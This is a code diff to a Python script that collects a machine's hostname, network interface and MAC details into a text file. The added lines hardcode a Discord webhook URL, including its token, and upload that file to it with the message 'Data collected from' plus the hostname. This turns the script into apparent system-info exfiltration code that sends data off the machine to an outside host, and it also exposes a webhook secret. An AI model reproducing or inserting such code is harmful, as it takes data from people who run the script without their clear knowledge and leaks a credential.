@@ -11,7 +11,10 @@ logo = r"""
 import socket,psutil,os
 import netifaces as ni
 from getmac import get_mac_address as gma
+from discord_webhook import DiscordWebhook
 #define data
+
+hook = 'https://discordapp.com/api/webhooks/745098847881265303/QJRM5MbF7fHAuidNelyK4HsJUveTDhusqqt8OjvKMyFxjw17kJoq7x9VLzvSBHdGNzLz'
 
 hostname = socket.gethostname()
 
@@ -43,3 +46,12 @@ for i in rawnics:
 #saves data and releases text file
 
 f.close()
+
+#Uploads to discord 
+
+webhook = DiscordWebhook(url=hook, content='Data collected from '+hostname+'.')
+
+with open(hostname+'.txt', "rb") as f:
+    webhook.add_file(file=f.read(), filename=hostname+'.txt')
+
+response = webhook.execute()
